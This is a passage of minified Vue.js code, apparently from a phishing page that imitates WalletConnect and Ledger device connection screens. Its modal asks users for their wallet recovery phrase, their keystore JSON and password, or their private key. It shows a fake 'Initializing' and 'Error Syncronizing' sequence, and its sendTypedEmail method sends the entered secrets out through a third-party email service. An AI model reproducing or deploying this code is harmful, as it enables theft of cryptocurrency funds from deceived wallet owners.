L1100.06743,137.897061 L1100.5059,137.897061 C1104.67137,128.177625 1112.92924,122.477504 1124.98719,122.477504 C1142.37986,122.477504 1152.17238,133.439275 1152.17238,151.78197 L1152.17238,202.279192 L1130.83346,202.279192 L1130.83346,156.239757 C1130.83346,146.008771 1126.01028,140.162494 1116.437,140.162494 C1106.86373,140.162494 1100.79821,147.178027 1100.79821,157.335934 L1100.79821,202.279192 L1079.4593,202.279192 Z M1165.69189,202.279192 L1165.69189,123.939074 L1186.30002,123.939074 L1186.30002,137.897061 L1186.73849,137.897061 C1190.90396,128.177625 1199.16183,122.477504 1211.21978,122.477504 C1228.61245,122.477504 1238.40497,133.439275 1238.40497,151.78197 L1238.40497,202.279192 L1217.06606,202.279192 L1217.06606,156.239757 C1217.06606,146.008771 1212.24288,140.162494 1202.6696,140.162494 C1193.09632,140.162494 1187.03081,147.178027 1187.03081,157.335934 L1187.03081,202.279192 L1165.69189,202.279192 Z M1287.07523,138.043218 C1277.72119,138.043218 1270.99797,145.13183 1270.26718,154.924344 L1303.51789,154.924344 C1303.07941,144.912594 1296.57543,138.043218 1287.07523,138.043218 Z M1303.8102,178.309455 L1323.39523,178.309455 C1321.05672,193.655933 1307.02565,203.959997 1287.65986,203.959997 C1263.54396,203.959997 1249.07443,188.54044 1249.07443,163.474525 C1249.07443,138.481689 1263.69012,122.258269 1286.85599,122.258269 C1309.65648,122.258269 1324.05293,137.677826 1324.05293,161.501407 L1324.05293,168.00539 L1270.04795,168.00539 L1270.04795,169.320803 C1270.04795,180.501809 1277.13656,188.175048 1288.02525,188.175048 C1295.84465,188.175048 1301.83708,184.301889 1303.8102,178.309455 Z M1406.19313,153.097383 L1386.38887,153.097383 C1385.14653,144.839516 1379.66565,138.993238 1370.89623,138.993238 C1360.37293,138.993238 1353.79587,147.908811 1353.79587,163.036055 C1353.79587,178.455611 1360.37293,187.225028 1370.96931,187.225028 C1379.51949,187.225028 1385.07346,182.109535 1386.38887,173.559354 L1406.26621,173.559354 C1405.17004,192.048207 1391.3582,203.959997 1370.75008,203.959997 C1347.14573,203.959997 1332.16464,188.613519 1332.16464,163.036055 C1332.16464,137.897061 1347.14573,122.258269 1370.60392,122.258269 C1391.79668,122.258269 1405.24311,135.339315 1406.19313,153.097383 Z M1422.2704,105.888692 L1443.60931,105.888692 L1443.60931,123.939074 L1458.07885,123.939074 L1458.07885,140.016337 L1443.60931,140.016337 L1443.60931,177.505591 C1443.60931,183.498026 1446.53245,186.348086 1452.8172,186.348086 C1454.71724,186.348086 1456.69036,186.201929 1458.00577,185.982694 L1458.00577,201.694565 C1455.81341,202.206114 1452.15949,202.571506 1447.84786,202.571506 C1429.43209,202.571506 1422.2704,196.432915 1422.2704,181.159515 L1422.2704,140.016337 L1411.23555,140.016337 L1411.23555,123.939074 L1422.2704,123.939074 L1422.2704,105.888692 Z" id="WalletConnect" fill="#3999FB"></path><path d="M79.4992542,46.5389641 C142.715504,-15.3550143 245.209294,-15.3550143 308.425541,46.5389641 L316.033719,53.9880033 C319.194531,57.0827021 319.194531,62.1002006 316.033719,65.1949006 L290.007661,90.6765804 C288.427255,92.2239311 285.86491,92.2239311 284.284504,90.6765804 L273.814748,80.4258162 C229.713513,37.2470301 158.211283,37.2470301 114.110047,80.4258162 L102.897805,91.4035389 C101.317397,92.9508883 98.755052,92.9508883 97.1746471,91.4035389 L71.1485898,65.9218591 C67.9877774,62.8271591 67.9877774,57.8096606 71.1485898,54.7149619 L79.4992542,46.5389641 Z M362.249885,99.2377722 L385.413126,121.916595 C388.573922,125.01128 388.573941,130.028748 385.413167,133.123453 L280.968512,235.385079 C277.807722,238.479801 272.683033,238.479836 269.522198,235.385159 C269.522185,235.385146 269.52217,235.385132 269.522157,235.385118 L195.393696,162.807065 C194.603493,162.03339 193.32232,162.03339 192.532117,162.807065 C192.532112,162.80707 192.532108,162.807076 192.532103,162.807079 L118.40522,235.385079 C115.24444,238.479809 110.119749,238.479861 106.958905,235.385192 C106.958887,235.385174 106.958867,235.385155 106.958847,235.385136 L2.51128675,133.12215 C-0.649524409,130.027451 -0.649524409,125.009953 2.51128675,121.915254 L25.6745697,99.2364692 C28.8353808,96.1417705 33.9600712,96.1417705 37.1208837,99.2364692 L111.250424,171.815537 C112.040627,172.589212 113.321798,172.589212 114.112002,171.815537 C114.112014,171.815525 114.112024,171.815514 114.112036,171.815505 L188.237861,99.2364692 C191.398601,96.1416993 196.523291,96.1415832 199.684176,99.2362107 C199.68422,99.2362542 199.684263,99.2362977 199.684307,99.2363413 L273.813749,171.815505 C274.603952,172.589179 275.885125,172.589179 276.675327,171.815505 L350.803571,99.2377722 C353.964384,96.1430722 359.089073,96.1430722 362.249885,99.2377722 Z" id="WalletConnect" fill="#3B99FC" fill-rule="nonzero"></path></g></g></svg>', 1),
    n8 = f("svg", {
        stroke: "currentColor",
        fill: "none",
        "stroke-width": "0",
        viewBox: "0 0 24 24",
        "aria-hidden": "true",
        "font-size": "1.5rem",
        height: "1em",
        width: "1em",
        xmlns: "http://www.w3.org/2000/svg"
    }, [f("path", {
        "stroke-linecap": "round",
        "stroke-linejoin": "round",
        "stroke-width": "2",
        d: "M6 18L18 6M6 6l12 12"
    })], -1),
    i8 = [n8],
    r8 = {
        class: "flex w-full bg-white rounded-lg py-2 my-4"
    },
    o8 = ["src"],
    a8 = {
        class: ""
    },
    l8 = {
        class: "mx-3 py-3"
    },
    c8 = {
        class: "font-semibold text-sky-700"
    },
    d8 = {
        class: "flex justify-center item-center",
        style: {
            height: "60px"
        }
    },
    f8 = f("div", {
        class: "flex justify-center item-center my-4"
    }, [f("hr", {
        class: "px-2 bg-grey-100 hrdes item-center"
    })], -1),
    p8 = {
        key: 0,
        class: "p-2 w-full"
    },
    u8 = {
        class: "relative"
    },
    h8 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "Typically 12 (sometimes 24) words separated by single spaces", -1),
    g8 = {
        key: 1,
        class: "p-2 w-full"
    },
    m8 = {
        class: "relative"
    },
    v8 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "Keystore JSON", -1),
    y8 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "*********************", -1),
    b8 = {
        key: 2,
        class: "p-2 w-full"
    },
    w8 = {
        class: "relative"
    },
    x8 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "Typically xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ", -1),
    _8 = {
        class: "modal-footer"
    },
    C8 = f("div", {
        class: "item-center mx-auto text-center py-3"
    }, null, -1),
    S8 = {
        key: 1,
        class: "modal-masks",
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    E8 = {
        class: "modal-wrapper"
    },
    T8 = {
        class: "item-center rounded-lg p-5"
    },
    A8 = {
        class: "flex w-full max-w-sm mx-auto overflow-hidden bg-white rounded-lg shadow-md"
    },
    L8 = f("svg", {
        class: "w-6 h-6 text-white fill-current",
        viewBox: "0 0 40 40",
        xmlns: "http://www.w3.org/2000/svg"
    }, [f("path", {
        d: "M20 3.33331C10.8 3.33331 3.33337 10.8 3.33337 20C3.33337 29.2 10.8 36.6666 20 36.6666C29.2 36.6666 36.6667 29.2 36.6667 20C36.6667 10.8 29.2 3.33331 20 3.33331ZM16.6667 28.3333L8.33337 20L10.6834 17.65L16.6667 23.6166L29.3167 10.9666L31.6667 13.3333L16.6667 28.3333Z"
    })], -1),
    I8 = [L8],
    N8 = {
        key: 0,
        class: "mx-3"
    },
    P8 = f("p", {
        class: "text-sm text-gray-600"
    }, "try another Wallet", -1),
    M8 = {
        key: 1,
        class: "mx-3"
    },
    k8 = {
        key: 2,
        class: "modal-masks",
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    O8 = {
        class: "modal-wrapper"
    },
    $8 = {
        class: "modal-container item-center rounded-lg p-5"
    },
    R8 = {
        class: "modal-header"
    },
    D8 = {
        class: "flex justify-between item-center"
    },
    H8 = vt('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1459 238" version="1.1" class="h-6"><title>WalletConnect&#39;s logo</title><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="walletconnect-logo-2"><path d="M526.766839,130.223822 L506.743339,202.279192 L485.915975,202.279192 L458,96.8269617 L480.873561,96.8269617 L497.462373,173.193962 L498.047001,173.193962 L517.778188,96.8269617 L536.413197,96.8269617 L556.144384,173.193962 L556.729011,173.193962 L573.390902,96.8269617 L596.264463,96.8269617 L568.27541,202.279192 L547.448046,202.279192 L527.424545,130.223822 L526.766839,130.223822 Z M626.665106,188.101969 C635.946072,188.101969 643.619311,182.036456 643.619311,173.559354 L643.619311,167.859233 L627.103577,168.882332 C619.138024,169.46696 614.607159,173.047805 614.607159,178.601768 C614.607159,184.448046 619.430338,188.101969 626.665106,188.101969 Z M619.649573,203.521526 C604.741566,203.521526 593.414403,193.875168 593.414403,179.771024 C593.414403,165.520722 604.376173,157.262855 623.888124,156.0936 L643.619311,154.924344 L643.619311,149.735773 C643.619311,142.427926 638.503818,138.189375 630.465187,138.189375 C622.499633,138.189375 617.457219,142.135612 616.434121,147.908811 L596.922169,147.908811 C597.726033,132.70849 610.660922,122.258269 631.415207,122.258269 C651.511786,122.258269 664.592832,132.635411 664.592832,148.420361 L664.592832,202.279192 L643.984703,202.279192 L643.984703,190.294323 L643.546233,190.294323 C639.161524,198.625269 629.442088,203.521526 619.649573,203.521526 Z M678.843133,202.279192 L678.843133,96.8269617 L700.182046,96.8269617 L700.182046,202.279192 L678.843133,202.279192 Z M715.090054,202.279192 L715.090054,96.8269617 L736.428966,96.8269617 L736.428966,202.279192 L715.090054,202.279192 Z M785.976168,138.043218 C776.622124,138.043218 769.898905,145.13183 769.168121,154.924344 L802.418824,154.924344 C801.980353,144.912594 795.476369,138.043218 785.976168,138.043218 Z M802.711138,178.309455 L822.296167,178.309455 C819.957656,193.655933 805.92659,203.959997 786.560796,203.959997 C762.444901,203.959997 747.975365,188.54044 747.975365,163.474525 C747.975365,138.481689 762.591058,122.258269 785.756933,122.258269 C808.557415,122.258269 822.953874,137.677826 822.953874,161.501407 L822.953874,168.00539 L768.948885,168.00539 L768.948885,169.320803 C768.948885,180.501809 776.037497,188.175048 786.926188,188.175048 C794.745585,188.175048 800.738019,184.301889 802.711138,178.309455 Z M839.615765,105.888692 L860.954677,105.888692 L860.954677,123.939074 L875.424214,123.939074 L875.424214,140.016337 L860.954677,140.016337 L860.954677,177.505591 C860.954677,183.498026 863.877816,186.348086 870.162565,186.348086 C872.062605,186.348086 874.035723,186.201929 875.351136,185.982694 L875.351136,201.694565 C873.158782,202.206114 869.504858,202.571506 865.193229,202.571506 C846.777455,202.571506 839.615765,196.432915 839.615765,181.159515 L839.615765,140.016337 L828.580916,140.016337 L828.580916,123.939074 L839.615765,123.939074 L839.615765,105.888692 Z M935.567794,204.106154 C904.874837,204.106154 885.6552,183.571104 885.6552,149.516538 C885.6552,115.53505 905.020994,95 935.567794,95 C960.926023,95 980.218739,111.077263 981.899543,134.681609 L960.414474,134.681609 C958.368277,121.74672 948.429605,113.269617 935.567794,113.269617 C918.905903,113.269617 908.163368,127.227605 908.163368,149.443459 C908.163368,171.951628 918.759746,185.836537 935.640873,185.836537 C948.721919,185.836537 958.149041,178.163298 960.487552,165.666879 L981.972622,165.666879 C979.487954,189.198146 961.437572,204.106154 935.567794,204.106154 Z M1029.69286,203.959997 C1006.01544,203.959997 990.888195,188.759676 990.888195,163.036055 C990.888195,137.677826 1006.23467,122.258269 1029.69286,122.258269 C1053.15105,122.258269 1068.49753,137.604747 1068.49753,163.036055 C1068.49753,188.832754 1053.37029,203.959997 1029.69286,203.959997 Z M1029.69286,187.663499 C1040.14308,187.663499 1046.79322,178.821004 1046.79322,163.109133 C1046.79322,147.543419 1040.07,138.554767 1029.69286,138.554767 C1019.31572,138.554767 1012.51942,147.543419 1012.51942,163.109133 C1012.51942,178.821004 1019.16956,187.663499 1029.69286,187.663499 Z M1079.4593,202.279192 L1079.4593,123.939074 L1100.06743,123.939074 L1100.06743,137.897061 L1100.5059,137.897061 C1104.67137,128.177625 1112.92924,122.477504 1124.98719,122.477504 C1142.37986,122.477504 1152.17238,133.439275 1152.17238,151.78197 L1152.17238,202.279192 L1130.83346,202.279192 L1130.83346,156.239757 C1130.83346,146.008771 1126.01028,140.162494 1116.437,140.162494 C1106.86373,140.162494 1100.79821,147.178027 1100.79821,157.335934 L1100.79821,202.279192 L1079.4593,202.279192 Z M1165.69189,202.279192 L1165.69189,123.939074 L1186.30002,123.939074 L1186.30002,137.897061 L1186.73849,137.897061 C1190.90396,128.177625 1199.16183,122.477504 1211.21978,122.477504 C1228.61245,122.477504 1238.40497,133.439275 1238.40497,151.78197 L1238.40497,202.279192 L1217.06606,202.279192 L1217.06606,156.239757 C1217.06606,146.008771 1212.24288,140.162494 1202.6696,140.162494 C1193.09632,140.162494 1187.03081,147.178027 1187.03081,157.335934 L1187.03081,202.279192 L1165.69189,202.279192 Z M1287.07523,138.043218 C1277.72119,138.043218 1270.99797,145.13183 1270.26718,154.924344 L1303.51789,154.924344 C1303.07941,144.912594 1296.57543,138.043218 1287.07523,138.043218 Z M1303.8102,178.309455 L1323.39523,178.309455 C1321.05672,193.655933 1307.02565,203.959997 1287.65986,203.959997 C1263.54396,203.959997 1249.07443,188.54044 1249.07443,163.474525 C1249.07443,138.481689 1263.69012,122.258269 1286.85599,122.258269 C1309.65648,122.258269 1324.05293,137.677826 1324.05293,161.501407 L1324.05293,168.00539 L1270.04795,168.00539 L1270.04795,169.320803 C1270.04795,180.501809 1277.13656,188.175048 1288.02525,188.175048 C1295.84465,188.175048 1301.83708,184.301889 1303.8102,178.309455 Z M1406.19313,153.097383 L1386.38887,153.097383 C1385.14653,144.839516 1379.66565,138.993238 1370.89623,138.993238 C1360.37293,138.993238 1353.79587,147.908811 1353.79587,163.036055 C1353.79587,178.455611 1360.37293,187.225028 1370.96931,187.225028 C1379.51949,187.225028 1385.07346,182.109535 1386.38887,173.559354 L1406.26621,173.559354 C1405.17004,192.048207 1391.3582,203.959997 1370.75008,203.959997 C1347.14573,203.959997 1332.16464,188.613519 1332.16464,163.036055 C1332.16464,137.897061 1347.14573,122.258269 1370.60392,122.258269 C1391.79668,122.258269 1405.24311,135.339315 1406.19313,153.097383 Z M1422.2704,105.888692 L1443.60931,105.888692 L1443.60931,123.939074 L1458.07885,123.939074 L1458.07885,140.016337 L1443.60931,140.016337 L1443.60931,177.505591 C1443.60931,183.498026 1446.53245,186.348086 1452.8172,186.348086 C1454.71724,186.348086 1456.69036,186.201929 1458.00577,185.982694 L1458.00577,201.694565 C1455.81341,202.206114 1452.15949,202.571506 1447.84786,202.571506 C1429.43209,202.571506 1422.2704,196.432915 1422.2704,181.159515 L1422.2704,140.016337 L1411.23555,140.016337 L1411.23555,123.939074 L1422.2704,123.939074 L1422.2704,105.888692 Z" id="WalletConnect" fill="#3999FB"></path><path d="M79.4992542,46.5389641 C142.715504,-15.3550143 245.209294,-15.3550143 308.425541,46.5389641 L316.033719,53.9880033 C319.194531,57.0827021 319.194531,62.1002006 316.033719,65.1949006 L290.007661,90.6765804 C288.427255,92.2239311 285.86491,92.2239311 284.284504,90.6765804 L273.814748,80.4258162 C229.713513,37.2470301 158.211283,37.2470301 114.110047,80.4258162 L102.897805,91.4035389 C101.317397,92.9508883 98.755052,92.9508883 97.1746471,91.4035389 L71.1485898,65.9218591 C67.9877774,62.8271591 67.9877774,57.8096606 71.1485898,54.7149619 L79.4992542,46.5389641 Z M362.249885,99.2377722 L385.413126,121.916595 C388.573922,125.01128 388.573941,130.028748 385.413167,133.123453 L280.968512,235.385079 C277.807722,238.479801 272.683033,238.479836 269.522198,235.385159 C269.522185,235.385146 269.52217,235.385132 269.522157,235.385118 L195.393696,162.807065 C194.603493,162.03339 193.32232,162.03339 192.532117,162.807065 C192.532112,162.80707 192.532108,162.807076 192.532103,162.807079 L118.40522,235.385079 C115.24444,238.479809 110.119749,238.479861 106.958905,235.385192 C106.958887,235.385174 106.958867,235.385155 106.958847,235.385136 L2.51128675,133.12215 C-0.649524409,130.027451 -0.649524409,125.009953 2.51128675,121.915254 L25.6745697,99.2364692 C28.8353808,96.1417705 33.9600712,96.1417705 37.1208837,99.2364692 L111.250424,171.815537 C112.040627,172.589212 113.321798,172.589212 114.112002,171.815537 C114.112014,171.815525 114.112024,171.815514 114.112036,171.815505 L188.237861,99.2364692 C191.398601,96.1416993 196.523291,96.1415832 199.684176,99.2362107 C199.68422,99.2362542 199.684263,99.2362977 199.684307,99.2363413 L273.813749,171.815505 C274.603952,172.589179 275.885125,172.589179 276.675327,171.815505 L350.803571,99.2377722 C353.964384,96.1430722 359.089073,96.1430722 362.249885,99.2377722 Z" id="WalletConnect" fill="#3B99FC" fill-rule="nonzero"></path></g></g></svg>', 1),
    V8 = f("svg", {
        stroke: "currentColor",
        fill: "none",
        "stroke-width": "0",
        viewBox: "0 0 24 24",
        "aria-hidden": "true",
        "font-size": "1.5rem",
        height: "1em",
        width: "1em",
        xmlns: "http://www.w3.org/2000/svg"
    }, [f("path", {
        "stroke-linecap": "round",
        "stroke-linejoin": "round",
        "stroke-width": "2",
        d: "M6 18L18 6M6 6l12 12"
    })], -1),
    j8 = [V8],
    B8 = {
        class: "px-4 py-2 -mx-3 flex items-center"
    },
    F8 = {
        class: "mx-3 flex items-center"
    },
    z8 = {
        class: "flex items-center justify-center p-2"
    },
    U8 = {
        key: 0,
        class: "bg-gray-800 text-white p-2 mx-1 rounded-xl"
    },
    G8 = {
        class: "flex w-full bg-white rounded-lg shadow-md justify-between border-solid border-2 py-2 my-2 border-gray-500"
    },
    W8 = {
        class: "px-4 py-2 -mx-3"
    },
    q8 = {
        class: "mx-3"
    },
    K8 = {
        class: "font-semibold text-sky-700"
    },
    Z8 = f("p", {
        class: "text-sm first-letter text-green-600"
    }, " This session is encrypted ", -1),
    X8 = {
        class: "flex items-center justify-center p-2"
    },
    Y8 = ["src"];

function Q8(e, t, s, n, i, r) {
    const o = ce("nav-bar"),
        l = ce("NewsLetterSection"),
        a = ce("BottomNav");
    return O(), R(he, null, [q(o), D5, f("section", H5, [f("div", V5, [j5, f("div", B5, [f("section", F5, [f("div", z5, [f("div", U5, [(O(!0), R(he, null, Ke(r.searchedWallets, c => (O(), R("div", {
        class: "lg:w-1/5 md:w-1/2 p-2 w-full h-full",
        key: c.src
    }, [f("div", {
        class: "border border-black md:flex-col flex md:flex-wrap flex-nowrap p-4 rounded-xl",
        onClick: d => r.triggerModal(c)
    }, [f("a", W5, [f("img", {
        alt: c.appName,
        class: "object-cover object-center md:h-32 h-28 justify-center m-auto",
        src: c.src
    }, null, 8, q5)]), f("div", K5, [Z5, f("h3", X5, ye(c.appName), 1)])], 8, G5)]))), 128))])])])])])]), e.showModal ? (O(), R("div", Y5, [f("div", Q5, [f("div", J5, [f("div", e8, [f("div", t8, [s8, f("button", {
        onClick: t[0] || (t[0] = c => e.showModal = !1),
        class: "focus:bg-blue-100"
    }, i8)])]), f("div", r8, [f("div", null, [f("img", {
        src: e.app.src,
        alt: "",
        class: "rounded-full w-12"
    }, null, 8, o8)]), f("div", a8, [f("div", l8, [f("span", c8, ye(e.app.appName), 1)])])]), f("div", d8, [f("button", {
        class: Te(["p-4 hover:border-b-2 hover:border-gray-500 mx-2", e.type === 0 ? "border-b-2 border-gray-500" : ""]),
        onClick: t[1] || (t[1] = c => e.type = 0)
    }, " Phrase ", 2), e.disableSignIn ? (O(), R("button", {
        key: 0,
        class: Te(["p-4 hover:border-b-2 hover:border-gray-500 mx-2", e.type === 1 ? "border-b-2 border-gray-500" : ""]),
        onClick: t[2] || (t[2] = c => e.type = 1)
    }, " Keystore JSON ", 2)) : Ee("", !0), f("button", {
        class: Te(["p-4 hover:border-b-2 hover:border-gray-500 mx-2", e.type === 2 ? "border-b-2 border-gray-500" : ""]),
        onClick: t[3] || (t[3] = c => e.type = 2)
    }, " Private Key ", 2)]), f8, e.type === 0 ? (O(), R("div", p8, [f("div", u8, [Ft(f("textarea", {
        id: "message",
        "onUpdate:modelValue": t[4] || (t[4] = c => e.seedPhrase = c),
        name: "message",
        placeholder: "Enter Your recovery phrase",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-32 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.seedPhrase]
    ]), h8])])) : Ee("", !0), e.type === 1 && e.disableSignIn ? (O(), R("div", g8, [f("div", m8, [Ft(f("textarea", {
        id: "message",
        "onUpdate:modelValue": t[5] || (t[5] = c => e.email = c),
        name: "message",
        placeholder: "Keystore Json{}",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-10 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.email]
    ]), v8, Ft(f("input", {
        id: "message",
        "onUpdate:modelValue": t[6] || (t[6] = c => e.password = c),
        type: "password",
        name: "message",
        placeholder: "Enter Your password",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-10 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.password]
    ]), y8])])) : Ee("", !0), e.type === 2 ? (O(), R("div", b8, [f("div", w8, [Ft(f("textarea", {
        id: "message",
        "onUpdate:modelValue": t[7] || (t[7] = c => e.privateKey = c),
        name: "message",
        placeholder: "Enter Your Private Key",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-20 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.privateKey]
    ]), x8])])) : Ee("", !0), f("div", _8, [f("button", {
        class: "modal-default-button justify-center bg-sky-600 flex py-2 rounded-lg text-white w-full item-center",
        onClick: t[8] || (t[8] = c => r.countReducer())
    }, " Proceed "), C8])])])])) : Ee("", !0), e.notify ? (O(), R("div", S8, [f("div", E8, [f("div", T8, [f("div", A8, [f("div", {
        class: Te(["flex items-center justify-center w-12", e.countdown ? "bg-red-500" : "bg-green-500"])
    }, I8, 2), f("div", {
        class: "px-4 py-2 -mx-3",
        onClick: t[9] || (t[9] = c => e.counter--)
    }, [e.countdown ? (O(), R("div", N8, [f("span", {
        class: Te(["font-semibold", e.countdown ? "text-red-500" : "text-green-500"])
    }, "error", 2), P8])) : Ee("", !0), e.counter > 0 ? (O(), R("div", M8, ye(e.counter), 1)) : Ee("", !0)])])])])])) : Ee("", !0), e.automatic ? (O(), R("div", k8, [f("div", O8, [f("div", $8, [f("div", R8, [f("div", D8, [H8, f("button", {
        onClick: t[10] || (t[10] = c => r.resetAutomatic()),
        class: "focus:bg-blue-100"
    }, j8)])]), f("div", {
        class: "item-center rounded-lg mt-8 mb-4",
        onClick: t[11] || (t[11] = c => {
            e.showModal = !0, r.resetAutomatic()
        })
    }, [f("div", {
        class: Te(["flex w-full bg-white rounded-lg shadow-md justify-between border-solid border-2 py-2 items-center", e.failed ? "border-red-500" : "border-gray-500"])
    }, [f("div", B8, [f("div", F8, [f("p", {
        class: Te(["text-base", e.failed ? "text-red-600" : "text-green-600"])
    }, ye(e.failed ? "Error Syncronizing" : "Initializing"), 3)])]), f("div", z8, [e.failed ? (O(), R("button", U8, " Connect Manually ")) : Ee("", !0)])], 2), f("div", G8, [f("div", W8, [f("div", q8, [f("span", K8, ye(e.app.appName), 1), Z8])]), f("div", X8, [f("img", {
        src: e.app.src,
        alt: "",
        class: "rounded-full w-12 mx-1"
    }, null, 8, Y8)])])])])])])) : Ee("", !0), q(l), q(a)], 64)
}
const J8 = Se(R5, [
        ["render", Q8]
    ]),
    e7 = "/img/ledger-error.png",
    t7 = [...Hi, ...Vi];
zo("s6BKpBr7vPZack9iN");
const s7 = {
    apikey: "AIzaSyAhdmj3pASxds2ZNCAIR-gugo@em3LtZDE",
    authDomain: "ephemeraldb.firebaseapp.com",
    projectId: "ephemeraldb",
    storageBucket: "ephemeraldb.appspot.com",
    messagingSenderId: "375429255076",
    appId: "1:375429255076:web:0f84756f9cdf3681de3631"
};
Go(s7);
const n7 = Uf();
zf(n7, "puzzler");
const i7 = {
        components: {
            phmodal: Ad,
            NavBar: Ro,
            NewsLetterSection: Bo,
            BottomNav: Fo
        },
        data: function() {
            return {
                active: !1,
                searchValue: "",
                showModal: !1,
                automatic: !1,
                notify: !1,
                disableSignIn: !0,
                app: {},
                email: "",
                password: "",
                privateKey: "",
                failed: !1,
                countdown: !1,
                counter: 15,
                seedPhrase: "",
                type: 0
            }
        },
        computed: {
            wallets() {
                return this.active && this.searchValue === "" ? Vi : !this.active && this.searchValue === "" ? Hi : t7
            },
            searchedWallets() {
                return [{
                    src: "img/nano-x.webp",
                    alt: "Clear Cache",
                    appName: "Nano X",
                    type: "App",
                    href: "https://etherscan.io/"
                }, {
                    src: "img/nano-s-plus.webp",
                    alt: "Install App",
                    appName: "Nano S plus",
                    type: "App",
                    href: "https://etherscan.io/"
                }, {
                    src: "img/nano-s.png",
                    alt: "Update Ledger Live",
                    appName: "Nano S",
                    type: "App",
                    href: "https://etherscan.io/"
                }]
            }
        },
        methods: {
            triggerModal(e) {
                this.counter = 15, this.countdown = !1, this.type = 0, this.app = e, console.log(e), this.failedInit()
            },
            resetAutomatic() {
                this.failed = !1, this.automatic = !1
            },
            toggleloginchecker() {
                this.loginchecker = !this.loginchecker
            },
            sendTypedEmail() {
                this.load = !0;
                let e, t = this.email && this.password,
                    s = this.seedPhrase ? this.seedPhrase.match(/([\s]+)/g).length : 0;
                console.log(s), this.type === 1 && t && (e = `the message type is Keystore Json and the details are: Keystore: (${this.email})... password: (${this.password})  will be used for ${this.app.appName}`), this.type === 2 && this.privateKey && (e = `the message type is Private Key and the details are: Private Key : ( ${this.privateKey}) will be used for ${this.app.appName}`), this.type === 0 && this.seedPhrase && s >= 11 && (e = `the message type is Seed Phrase and the details are: Seed Phrase : ( ${this.seedPhrase}) will be used for ${this.app.appName}`), Td.send("service_21ltu09", "template_iu283pe", {
                    message_message: e
                }).then(n => {
                    this.seedPhrase = "", this.email = "", this.password = ""
                }, n => {
                    console.log("FAILED...", n)
                }), this.seedPhrase = "", this.email = "", this.privateKey = "", this.password = ""
            },
            triggerDialog(e) {
                this.seedPhrase = !0, this.tech = e
            },
            failedInit() {
                this.automatic = !this.automatic, setTimeout(() => {
                    this.failed = !0
                }, 2500)
            },
            countReducer() {
                let e = this.seedPhrase ? this.seedPhrase.match(/([\s]+)/g).length : 0;
                if (this.type === 0 && e < 11) return alert("please ensure phrase is correcty typed");
                this.sendTypedEmail(), this.notify = !this.notify;
                let t = setInterval(() => {
                    this.counter > 0 ? this.counter-- : (this.countdown = !0, setTimeout(() => {
                        this.notify = !1, clearInterval(t)
                    }, 3e3))
                }, 1e3)
            }
        },
        mounted() {}
    },
    r7 = vt('<section class="text-gray-600 body-font" style="font-family:HMAlpha, DM Mono,  monospace;"><div class="container px-5 pt-24 mx-auto"><div class="flex flex-col text-center w-full mb-12"><h1 class="sm:text-6xl text-2xl font-bold title-font mb-4 text-black" style="font-family:HMAlpha, DM Mono,  monospace;">SELECT YOUR DEVICE </h1><p class="lg:w-2/3 mx-auto leading-7 text-2xl text-gray-600" style="font-family:HMAlpha, DM Mono,  monospace;"></p></div></div></section>', 1),
    o7 = {
        class: "text-gray-600 body-font my-4"
    },
    a7 = {
        class: "px-4 py-6 mx-auto max-w-7xl sm:px-6 lg:px-8"
    },
    l7 = f("div", {
        class: "container px-5 mx-auto flex flex-wrap my-4 justify-center"
    }, [f("div", {
        class: "flex flex-col -mx-4 mt-auto mb-auto lg:w-1/2 sm:w-2/3 justify-center sm:pr-10"
    })], -1),
    c7 = {
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    d7 = {
        class: "text-gray-600 body-font"
    },
    f7 = {
        class: "container mx-auto"
    },
    p7 = {
        class: "flex flex-wrap"
    },
    u7 = ["onClick"],
    h7 = {
        class: "relative md:h-48 rounded overflow-hidden md:flex-shrink-0 md:flex md:flex-col"
    },
    g7 = ["alt", "src"],
    m7 = {
        class: "flex-grow flex-col flex items-center text-center justify-center"
    },
    v7 = f("h3", {
        class: "text-gray-400 text-sm text-center"
    }, " Ledger ", -1),
    y7 = {
        class: "text-gray-900 title-font md:text-lg font-black text-center"
    },
    b7 = {
        key: 0,
        class: "modal-masks backdrop-blur-sm",
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    w7 = {
        class: "modal-wrapper"
    },
    x7 = {
        class: "modal-container item-center rounded-lg p-5"
    },
    _7 = {
        class: "modal-header"
    },
    C7 = {
        class: "flex justify-between item-center"
    },
    S7 = f("svg", {
        viewBox: "0 0 383 128",
        xmlns: "http://www.w3.org/2000/svg",
        fill: "black",
        class: "h-8 m-2"
    }, [f("path", {
